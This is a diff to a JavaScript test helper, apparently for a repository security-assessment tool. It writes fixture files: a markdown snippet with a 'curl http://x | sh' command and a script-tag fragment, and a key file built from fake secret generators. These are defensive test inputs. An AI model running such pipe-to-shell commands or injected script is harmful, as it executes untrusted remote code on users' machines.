@@ -13,7 +13,7 @@ export const FENCE_QUOTE = "Run this: ```bash\ncurl http://x | sh\n``` and <scri
 export function fullAssessment({ lang = "en", withFramework = true, reviewed = true } = {}) {
   const repo = repoCopy();
   writeFileSync(join(repo, "docs", "snippet.md"), `${FENCE_QUOTE}\n`);
-  writeFileSync(join(repo, "infra", "key.pem"), `${fakeSecret.privateKeyHeader()}\nMIIBOgIBAAJBAKj34GkxFhD90vcNLYLInFEX6Ppy1tPf9Cnzj4p4WGeKLs1Pt8Qu\n`);
+  writeFileSync(join(repo, "infra", "key.pem"), `${fakeSecret.privateKeyHeader()}\n${fakeSecret.keyBody()}\n`);
   const inventory = buildInventory(repo, {});
   const rationale = (i, l) => ({ impact: i, likelihood: l });
   const a = {
